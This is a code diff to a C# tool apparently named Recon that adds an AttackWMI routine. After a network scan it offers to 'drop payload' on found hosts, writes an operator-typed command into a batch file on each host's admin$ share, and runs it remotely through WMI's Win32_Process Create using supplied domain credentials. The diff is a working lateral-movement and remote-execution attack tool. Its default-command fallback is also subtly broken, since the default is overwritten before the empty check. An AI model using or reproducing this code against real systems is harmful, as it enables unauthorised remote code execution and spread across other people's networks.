@@ -137,10 +137,22 @@ namespace Recon
 
             Console.WriteLine("Scanning finished");
 
-            foreach(string targets in wmiList)
-            {
-                Console.WriteLine(targets);
+            //See if user wants to drop payloads via WMI
+            Console.WriteLine("Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
+            string targetWmi = Console.ReadLine();
 
+            while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
+            {
+                Console.WriteLine("Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
+                targetWmi = Console.ReadLine();
+            }
+            if (targetWmi == "y")
+            {
+                // Attack targets
+                foreach (string target in wmiList)
+                {
+                    AttackWMI(wmiUsername, wmiPassword, domainURL, target);
+                }
             }
 
         }
@@ -537,24 +549,60 @@ namespace Recon
 
 
         //For attacking found WMI targets later
-        //public static void AttackWMI()
-        //{
-        //    Console.WriteLine("Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
-        //    string targetWmi = Console.ReadLine();
+        public static void AttackWMI(string wmiUsername, string wmiPassword, string domainURL, string hostname)
+        {
+            //Get commands for attack
+            string commandFile = @"\\" + hostname + "\\admin$\\process.bat";
 
-        //    while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
-        //    {
-        //        Console.WriteLine("Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
-        //        targetWmi = Console.ReadLine();
-        //    }
-        //    if (targetWmi == "y")
-        //    {
-        //        foreach (string target in wmiList)
-        //        {
-        //            Console.WriteLine(target);
-        //        }
-        //    }
-        //}
+
+            //Delete the file if it exists already
+            if (File.Exists(commandFile))
+            {
+                File.Delete(commandFile);
+            }
+
+            StreamWriter sw = new StreamWriter(commandFile);
+
+            //Command
+            string command = "DIR > <a>\\\\</a>" + hostname + "\\admin$\\output.txt";
+            Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
+            //Get command from user
+            command = Console.ReadLine();
+            if (command.Trim() == string.Empty)
+            {
+                Console.WriteLine("No command entered, using default command for test: " + command);
+            }
+            sw.WriteLine(command);
+            sw.Close();
+
+            Console.WriteLine("Attacking via WMI..");
+            ConnectionOptions options = new ConnectionOptions();
+            options.Impersonation = ImpersonationLevel.Impersonate;
+            options.Username = wmiUsername;
+            options.Password = wmiPassword;
+            options.Authority = "ntlmdomain:" + domainURL;
+
+            ManagementScope scope = new ManagementScope("\\\\" + hostname + "\\root\\cimv2", options);
+            scope.Connect();
+
+            ObjectGetOptions objectGetOptions = new ObjectGetOptions();
+            //Management path
+            ManagementPath managementPath = new ManagementPath("Win32_Process");
+            //Class
+            ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);
+
+            //Create method parameters
+            ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
+
+            inParams["CommandLine"] = commandFile;
+
+            ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
+
+            Console.WriteLine("Creation of the process return: " + outParams["returnValue"]);
+            Console.WriteLine("Process ID: " + outParams["processId"]);
+
+            
+        }
 
 
         //well known ports methods
